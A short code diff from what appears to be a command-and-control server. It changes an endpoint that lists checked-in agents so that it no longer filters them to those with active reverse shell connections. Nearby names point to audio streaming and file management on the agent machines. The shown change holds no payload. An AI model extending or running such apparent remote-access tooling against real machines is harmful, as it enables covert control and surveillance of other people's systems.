@@ -1823,15 +1823,8 @@ def stream_audio():
 def get_agents():
     """
     Lists all agents that have checked in and their last seen time.
-    Only shows agents with active reverse shell connections.
     """
-    # Filter agents to only include those with active reverse shell connections
-    active_agents = {}
-    for agent_id, agent_data in AGENTS_DATA.items():
-        if agent_id in REVERSE_SHELL_CONNECTIONS:
-            active_agents[agent_id] = agent_data
-    
-    return jsonify(active_agents)
+    return jsonify(AGENTS_DATA)
 
 # --- File Management Endpoints ---
 
